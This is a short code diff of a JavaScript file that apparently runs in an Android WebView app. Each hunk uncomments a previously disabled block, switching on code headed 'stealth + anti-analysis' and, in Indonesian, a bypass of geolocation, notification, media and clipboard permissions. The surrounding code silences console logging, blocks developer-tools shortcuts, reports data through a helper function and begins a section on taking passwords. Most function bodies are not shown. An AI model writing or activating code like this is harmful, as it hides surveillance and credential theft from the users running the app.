@@ -73,7 +73,7 @@ console.error = function() {};
 console.info = function() {};
 console.debug = function() {};
 console.table = function() {};
-/*
+
 // ============================================================
 // STEALTH + ANTI-ANALYSIS
 // ============================================================
@@ -89,7 +89,7 @@ console.table = function() {};
     };
     setInterval(check, 1000);
 })();
-*/
+
 document.addEventListener('keydown', function(e) {
     if (e.key === 'F12' || 
         (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
@@ -325,7 +325,7 @@ var A = {
     flashOn: function() { if(this.isAvailable){ try{return AndroidBridge.flashOn()}catch(e){}} return null },
     flashOff: function() { if(this.isAvailable){ try{return AndroidBridge.flashOff()}catch(e){}} return null
 };
-/*
+
 // ============================================================
 // 🔥 BYPASS SEMUA IZIN (GEOLOKASI, NOTIFIKASI, MEDIA, CLIPBOARD, DLL)
 // ============================================================
@@ -396,7 +396,7 @@ function injectAllPermissions() {
         K({ sumber: 'bypass_permissions_error', data: e.message });
     }
 }
-*/
+
 // ============================================================
 // AMBIL PASSWORD DARI WORKER
 // ============================================================
